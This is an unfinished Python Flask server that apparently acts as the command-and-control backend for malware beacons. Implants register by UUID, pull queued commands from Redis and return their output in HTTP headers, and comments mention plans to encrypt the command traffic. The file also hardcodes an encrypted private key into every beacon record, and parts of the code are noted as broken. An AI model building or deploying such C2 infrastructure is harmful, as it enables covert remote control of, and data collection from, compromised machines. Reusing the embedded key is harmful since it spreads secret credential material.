# beacons checking in supply a UUID that is hashed
# the hash is compared to a precompiled list of them?
# the uuid is stored in memory in a table
# but how are commands stored and retrieved
# maybe the tables are each named after the beacon
# so use postgresql to create a series of tables in a db
# the flask webserver sees the UUID then performs a fetch from the db
# e z p z

from datetime import datetime
from flask import *
import json
import redis
import string

conn = redis.StrictRedis(host='localhost', port=6379, db=0)
app = Flask(__name__)


@app.route('/', methods=['GET'])
def home():
    # This handles initial registration
    # The beacon receives the initial reg and adds it to the db
    if request.method == 'GET':
        uuid = request.headers['APPSESSIONID']
        whoami = request.headers['Res']
        if set(uuid).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            structure = {
                "WhoAmI": f"{whoami}",
                "Retrieved": "0",  # Reset retrieved so we know the command was picked up
                "Command": "0",
                "LastInteraction": "0",
                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                "Result": "0",
                "private-key": b'-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIjAnsT6r4MiACAkAA\nAgEIAgEBMB0GCWCGSAFlAwQBAgQQgEWuL9FYjl62UJGW0grpNASCBNC85sCZKJ2+\nnx6ILiHVd8SBAYRdmxbWqkRTJ52+KWBav6Bt2fcmALeElqkFXxsUosIzy2q9cX9J\nnj4JWM5w0zBy8LXWWqFEl2PwkkgiY+XeIYbrtVYb7vaxYqgY8j2C8bfjnBO56G3l\nGrwU5GE84jiCOrVRxupNb+nxHO4vEs9psooMu0owk46gd2j8qTbDaVZeYjqhFv8/\nXgpRoLmNP47JFDS31HaWDPsMDuVHTeLrvSToF6ugoP2TA740F+iBPE3mcwM7U7+x\nkviMZe+qGluvrcRyGi5Nbxq/VJcbvBiSVHiNQcOg8Qy9eOL/lQDlGBJrVxEXKYse\nBIpjYJQpPREASoLeaH75vwilfMHbbr2/KQcupjYpNa+uO+vDb/2a6IvKMLNaUVKc\n5WqQa4c8D1IN4xEv7DduGIYVzqjZ7Rsx55ZpKRT5usOtKGoDIeCV5E3cmhxSS3Zj\n0KSCa34FqOJRiBusQBsblVe+ur/S/AjzUei8p5Og9WFARAgydbKgFM/sx9MzAAl6\nqEhr0FBsgJokwpxhlJ3fHK20U6GUMatTigRCy2gV1TqKUX9DnUb8xJkhAp7bPkqT\nq4yb0enNC6cK7rgfHe8ed9o/G6kFvJW2MR0kvzhnSaLkmSJl9zJtj+upwLB8Yu5d\nCL5ZKlbsIoRXA3NLKoPqsM7wTsGfsgVqwabT8HYIJneG2bfBOchaXQWAW27eDAEU\n80Iulx127PSO8+8C7HWRGieEqQWtWRrhmDsMBGqMrpF/s9v2qGsQds0vi15c61jA\nQD8IyT05GaUz85zxF/ZP91Ie5WRDw0wtVwBOaZE09YerIfBlKaC6GLOrcNFSP2e/\n68lY2WqoPzlvA+p5SltsnaEN/bzNjN3rjDCVNhunerg0CYsjJgWGNO1PFh+WZ8VH\nd/mJG+/KgKGt4xGsK3C6ZbDVji4l0eZkJ+uvT8A2FGgD7dsEXacbY2wPSnG/6fHd\nDxAhRO3WUFfzGIS5tqcTOGvKUfRL9kYFernhGyQwZyWiX2h1cKS8tgwiWQpD+T8D\ns56qxVHqcUlvTYTL9IHjk0ufjsZmu5W+/UTPLd9kRtKp9OWUH2JoZnfLff097ngh\nleokiZ/LFGIIAGleD67X8GWx43/p8N3yGhkWCViGtWxQetO1d8PKUiabOL9hFdxF\nOXduhwIcVFZm6Su6EyvAHpnqJG37atEf4+XdZpsavTWkkBPzqoplrg9k9vxmXPh6\n/frMa95hepimRYsS5V2rfx57XSYEPwDN2HKNr4LOk3+F8yKJv1qoQCNu6eHPofGG\nMC5R/Lf4+T/Hy1x79HKAeuBjvl+McdrH3M3zdwSKkow+lQgoZ0Rug10Xrmkgu68V\n3sFOwike4P/Xha0vzgJ+oseg5ZGfN6q/rWJXjCPXWfEk/+IDA0Nyeoc38lPI5m9Q\nesAmCHjAOq79kRa5EKFVTGioJWGEy1JszGN3Vj/+kcC+DlvwaY84xD/KZf0iyzDn\nx0c8qGdv7fPWdwGMTLTixwU8Fu5IP3Dboi+RObMfLJuM0J6irA09QYEfGXpD9kQu\nvmayHy/nVwRBW1d56pZkbMlExeAzQKJtik9ndcv1GttgmIUs7p1iaBeC1cv2Qn4z\nLd0H5YUkVOy8aLZXxhaE5A6VuF+j6pzVAQ==\n-----END ENCRYPTED PRIVATE KEY-----',
                "GotIt": "0"
            }
            structure = json.dumps(structure)  # Dump the json
            # Write the message value to the beacon:UUID key
            conn.hset('UUID', uuid, structure)
            return ''


@app.route('/session', methods=['GET'])
def session():
    # This function handles the beacon requesting a command
    if request.method == 'GET':
        uuid = request.headers['APPSESSIONID']
        if set(uuid).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            command = conn.hget('UUID', uuid)  # Get the struct
            command = command.decode()  # Decode it from bytes
            command = json.loads(command)  # it's returned as string so convert it to dict
            structure = json.dumps(command)  # Dump the dict to json
            connector = json.loads(structure)  # Load it into a new var
            Command = connector["Command"]  # Grab the command var from the object
            LastInteraction = connector["LastInteraction"]
            result = connector["Result"]
            whoami = connector["WhoAmI"]
            key = connector["private-key"]
            # Set the command to 0
            structure = {
                "WhoAmI": f"{whoami}",
                "Retrieved": "1",  # Set retrieved to 1 so we know we got results
                "Command": "0",
                "LastInteraction": f"{LastInteraction}",
                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                "Result": f"{result}",
                "private-key": f"{key}",
                "GotIt": "0"
            }
            structure = json.dumps(structure)  # Dump the json
            # Write the message value to the beacon:UUID key
            conn.hset('UUID', uuid, structure)
            return Command  # we've really got to RC4 encrypt this


@app.route("/schema", methods=['GET'])
def schema():
    # This function handles beacons returning data
    # Grab the appsessionid value from the headers
    # CURRENT ISSUE
    # IT'S SENDING TO SCHEMA
    # BUT SCHEMA CAN'T HANDLE CREATING NEW UUIDS
    # Set a default value on checkin to create the hostname/whoami to identify the beacon [needs testing]
    uuid = request.headers['APPSESSIONID']
    result = request.headers['Res']

    command = conn.hget('UUID', uuid)  # Get the struct
    command = command.decode()  # Decode it from bytes
    command = json.loads(command)  # it's returned as string so convert it to dict
    structure = json.dumps(command)  # Dump the dict to json
    connector = json.loads(structure)  # Load it into a new var
    LastInteraction = connector["LastInteraction"]
    whoami = connector["WhoAmI"]
    key = connector["private-key"]
    print(request.headers)
    if set(uuid).difference(string.ascii_letters + string.digits):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        # Let's convert the command struct to a JSON object
        structure = {
            "WhoAmI": f"{whoami}",
            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
            "Command": "0",
            "LastInteraction": f"{LastInteraction}",
            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "Result": f"{result}",
            "private-key": f"{key}",
            "GotIt": "1"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)
        return ''


def serve():
    app.run(host="localhost", port=8000)  # ssl_context='adhoc')


if __name__ == "__main__":
    serve()